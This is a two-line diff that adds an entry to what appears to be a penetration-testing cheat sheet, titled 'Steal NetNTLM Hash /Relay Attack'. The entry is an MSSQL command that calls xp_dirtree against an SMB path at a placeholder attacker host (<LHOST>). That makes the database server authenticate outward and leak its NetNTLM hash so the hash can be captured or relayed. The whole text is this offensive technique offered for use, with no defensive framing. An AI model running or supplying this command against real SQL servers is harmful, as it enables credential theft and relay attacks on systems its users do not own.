@@ -1,1 +1,2 @@
-
+Steal NetNTLM Hash /Relay Attack
+SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
